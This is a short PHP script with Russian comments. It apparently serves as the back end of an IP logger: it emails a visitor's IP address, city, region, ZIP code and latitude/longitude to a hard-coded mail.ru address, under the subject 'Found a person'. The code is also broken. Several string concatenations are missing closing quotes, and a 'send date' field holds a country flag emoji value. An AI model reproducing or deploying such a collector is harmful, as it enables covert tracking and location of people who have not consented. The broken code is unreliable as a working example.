<?php
$to  = 'err.not.founds@mail.ru';  // обратите внимание на запятую

$subject = 'Нашли человека ' . $_POST['country_name'];

$message = 'Страна - ' . $_POST['country_name'] . '<br />;
'Город - ' . $_POST['city'] . '<br />;
'ip - ' . $_POST['ip'] . '<br />;
'Используемый протокол перелачи - ' . $_POST['type'] . '<br />;
'zip-код - ' . $_POST['zip'] . '<br />;
'Широта - ' . $_POST['latitude'] . '<br />;
'Долгота - ' . $_POST['longitude'] . '<br />;
'Имя региона - ' . $_POST['region_name'] . '<br />;
'Дата отправки - ' . $_POST['location.country_flag_emoji_unicode'] . '<br />;

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

$headers .= 'To: Anonymous <err.not.founds@mail.ru>' . "\r\n"; // Свое имя и email

mail($to, $subject, $message, $headers);
?>